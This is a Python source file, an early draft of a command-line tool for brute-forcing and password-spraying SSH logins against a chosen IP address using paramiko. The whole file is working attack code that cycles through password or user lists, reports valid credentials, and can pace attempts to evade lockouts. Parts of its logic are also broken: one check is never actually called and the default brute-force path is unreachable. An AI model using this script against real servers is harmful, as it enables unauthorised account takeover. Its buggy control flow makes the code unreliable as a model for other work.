#!/usr/bin/env python3 -tt
#-*- coding: utf-8 -*-

"""
NAME: password_finder.py
VERSION: 0.1
AUTHOR: Jesse Leverett (CyberThulhu)
STATUS: Building Initial code framework
DESCRIPTION: Allows for a User to bruteforce/password spray SSH credentials
TO-DO: 
    [ ] Test Code
    [ ] Continue Building Framework
    [ ] Add Threading
    [ ] Impliment Single User, Single Password Mode
    [ ] Impliment Multi User, Multi Password
    [ ] Add Ouptut Option Functionality
COPYRIGHT Â© 2021 Jesse Leverett
"""

# Imports
import sys
import time
import socket
import argparse
import ipaddress
#from threading import Thread
from datetime import datetime
try:
    from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
except ImportError:
    print("[-] ERROR: 'paramiko' is a required package to run this program.")
    sys.exit(1)

# Added Variables
__author__      = "Jesse Leverett"
__copyright__   = "Copyright (C) 2021 Jesse Leverett"
__license__     = "MIT License"
__version__     = "0.1"

# Instantiate Argparser
PROG_DESCRIPTION    = "Allows for a User to bruteforce/password spray SSH credentials"
PROG_EPILOG         = f"{__copyright__}"
VERSION_HELP_TEXT   = "Prints Version Information"
parser = argparse.ArgumentParser(prog="password_finder", description = PROG_DESCRIPTION,
                                epilog = PROG_EPILOG, formatter_class= argparse.RawDescriptionHelpFormatter)
parser.add_argument('--version', action="version",
                    version=f"PROG: %(prog)s \t VERSION: {__version__}", help=VERSION_HELP_TEXT)

# Instantiate SubParsers
sub_parser = parser.add_subparsers(description="Select the Mode to Use", dest="passw_finder_mode")

# Add SubParsers
brute_force_parser = sub_parser.add_parser("bf", help="Brute Forcing Mode")
passw_spray_parser = sub_parser.add_parser("ps", help="Password Spraying Mode")

# Shared Arguments
def add_parse_arguments(input_sub_parser=None):
    """ Shared Arguments for Sub-Parsers """
    # Help Texts for Arguments
    IPADDR_HELP_TEXT    = "Sets IP Address"
    PORT_HELP_TEXT      = "If used; Sets Port [Default: 22]"
    TIMEOUT_HELP_TEXT   = "If used; Sets SSH Connection timeout (secs) [Default=1]"
    QOS_HELP_TEXT       = "If used; Exits program on successful credentials"
    OUTPUT_HELP_TEXT    = "If used; Outputs results to file"
    VERBOSE_HELP_TEXT   = "If used; Sets Verbosity [Default: False]"    
    
    # Add Shared Arguments
    input_sub_parser.add_argument('-i', dest="ip_address", metavar='X.X.X.X',
                                type=str, default=None, required=True, help=IPADDR_HELP_TEXT)
    input_sub_parser.add_argument('-p', dest="protocol_port", metavar='#',
                                type=int, default=22, required=False, help=PORT_HELP_TEXT)
    input_sub_parser.add_argument('-t', dest="set_timeout", metavar='#',
                                type=int, default=1, required=False, help=TIMEOUT_HELP_TEXT)
    input_sub_parser.add_argument('-q', dest="quit_on_success", default=False,
                                required=False, action="store_true", help=QOS_HELP_TEXT)
    input_sub_parser.add_argument('-o', dest="output_file", metavar=r'outfile.txt',
                                type=str, default=None, required=False, help=OUTPUT_HELP_TEXT)
    input_sub_parser.add_argument('-v', dest="verbose", default=False,
                                required=False, action="store_true", help=VERBOSE_HELP_TEXT)
    return

# Brute Forcing Arguments
USERN_HELP_TEXT = "Sets Username to Brute Force"
PASSL_HELP_TEXT = "Sets List of Passwords to Attempt"
LIMIT_HELP_TEXT = "If used; Sets Limit of Password attempts"
WTIME_HELP_TEXT = "If used; Sets Wait time Between Attempts"

brute_force_parser.add_argument('-u', '--username', dest="bf_username", metavar='',
                                type=str, default=None, required=True, help=USERN_HELP_TEXT)
brute_force_parser.add_argument('-c', '--passlist', dest="bf_passlist", metavar='',
                                type=str, default=None, required=True, help=PASSL_HELP_TEXT)
brute_force_parser.add_argument('-l', dest="num_of_passw_attempts", metavar='#',
                                type=int, default=None, required=False, help=LIMIT_HELP_TEXT)
brute_force_parser.add_argument('-w', dest="wait_time_per_attempts", metavar='#',
                                type=int, default=None, required=False, help=WTIME_HELP_TEXT)
add_parse_arguments(brute_force_parser)

# Password Spraying Arguments
USERL_HELP_TEXT = "Sets List of Users to Password Spray"
PASSW_HELP_TEXT = "Sets Password to Attempt"
passw_spray_parser.add_argument('-u', '--userlist', dest="ps_userlist", metavar='',
                                type=str, default=None, required=True, help=USERL_HELP_TEXT)
passw_spray_parser.add_argument('-c', '--password', dest="ps_password", metavar='',
                                type=str, default=None, required=True, help=PASSW_HELP_TEXT)
add_parse_arguments(passw_spray_parser)

# Parse Arguments
args = parser.parse_args()

# Initial Functions
def verbosity_checker(verbose_text:str) -> str:
    """ Checks if the Verbose Argument is True then Returns Parameter"""
    if args.verbose is True:
        print(verbose_text)

# Class SSH Connection
class SSHConnect(object):
    """ Class for SSH Connection """
    def __init__(self, username:str=None, password:str=None, timeout:int=args.set_timeout,
                ip_address:str=args.ip_address, protocol_port:int=args.protocol_port) -> None:
        self.username       = username
        self.password       = password
        self.timeout        = timeout
        self.ip_address     = ip_address
        self.protocol_port  = protocol_port
        self.ssh_client     = SSHClient()
        self.ssh_client.set_missing_host_key_policy(AutoAddPolicy())

    def test_ip_struct(self) -> bool:
        """Checks if string is an IP Address"""
        try:
            ipaddress.ip_address(self.ip_address)
            verbosity_checker(f"[+] TASK: Gathering Information for Address/Netmask: {self.ip_address}")
            return True
        except ValueError:
            print(f"[-] ERROR: Address/Netmask is invalid...Skipping: {self.ip_address}")
            return False

    def test_connection(self) -> bool:
        """ Testing Connection to Destination """
        try:
            socket.gethostbyaddr(self.ip_address)
            verbosity_checker(f"[!] INFO: {self.ip_address} is UP!")
            return True
        except (socket.error, socket.herror, socket.gaierror, socket.timeout, OSError):
            print(f"[-] ERROR: Could not connect to {self.ip_address}.")
            return False
    
    def test_protocol(self) -> bool:
        """ Testing if SSH/Port 22 is Open """
        try:
            start_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            start_socket.settimeout(self.timeout)
            start_socket.connect((self.ip_address, self.protocol_port))
            verbosity_checker(f"[!] INFO: {self.protocol_port} is OPEN!")
        except (socket.error, socket.herror, socket.gaierror, socket.timeout, OSError):
            print(f"[-] ERROR: Could not connect to {self.ip_address}:{self.protocol_port}")
            return False
        finally:
            start_socket.shutdown(socket.SHUT_RDWR)
            start_socket.close
            return True

    def ssh_connection(self) -> None:
        """ Creating Connection to IP/Port """
        try:
            self.ssh_client.connect(self.ip_address, self.protocol_port, self.username, self.password)
            print(f"[+] INFO: Correct USER/PASS Combo: {self.username} : {self.password}")
        except AuthenticationException:
            verbosity_checker(f"[-] INFO: Incorrect USER/PASS Combo: {self.username} : {self.password}")
        finally:
            self.ssh_client.close()
            return

def read_file(file:str) -> list:
    """Reads a File"""
    # Open and Read a File
    outfile = []
    with open(fr'{file}', 'r', encoding="utf-8") as infile:
        for line in infile.readlines():
            outfile.append(line.rstrip())
    return outfile

def output_results(result_to_outfile:str, outfile:str=args.output_file) -> str:
    """Outputs results to a file or to the screen"""
    if outfile is not None:
        with open(str(outfile), "a", encoding="utf-8") as output_file:
            output_file.write(result_to_outfile)
        return f"[!] INFO: Results written to {output_file}"
    return result_to_outfile

# Re-evaluate this function and How it fits into the Main program
def attempt_wait_interval(pass_attempts:int, time_wait:int, pass_list:list):
    """ If user wants to set an amount of attempts per time """
    for attempt in range(1, len(pass_list)):
        if attempt % pass_attempts == 0:
            time.sleep(time_wait)

def main() -> None:
    """ Main Code """
    init_obj = SSHConnect()
    if init_obj.test_ip_struct() and init_obj.test_connection() and init_obj.test_protocol:
        if args.passw_finder_mode == "bf":
            bf_password_list = read_file(args.bf_passlist)
            bf_pssw_list_len = len(bf_password_list) + 1
            if args.num_of_passw_attempts is not None and args.wait_time_per_attempts is not None:
                for index in range(1, bf_pssw_list_len):
                    password = bf_password_list[index-1]
                    print(f"{args.bf_username}:{password}")
                    SSHConnect(args.bf_username, password).ssh_connection()
                    if index % args.num_of_passw_attempts == 0:
                        time.sleep(args.wait_time_per_attempts)
            elif args.num_of_passw_attempts is None or args.wait_time_per_attempts is None:
                pass
            else:
                for password in bf_password_list:
                    print(f"{args.bf_username}:{password}")
                    SSHConnect(args.bf_username, password).ssh_connection()
        elif args.passw_finder_mode == "ps":
            ps_username_list = read_file(args.ps_userlist)
            for username in ps_username_list:
                print(f"{username}:{args.ps_password}")
                ssh_connect_obj = SSHConnect(username, args.ps_password)
                ssh_connect_obj.ssh_connection()
    return

if __name__ == "__main__":
    try:
        start_time = datetime.now()
        main()
        close_time = datetime.now()
        total_time = close_time - start_time
        verbosity_checker(f"[!] INFO: Total Execution Time {total_time}")
        sys.exit(0)
    except (KeyboardInterrupt, OSError):
        sys.exit(1)
else:
    sys.exit(1)
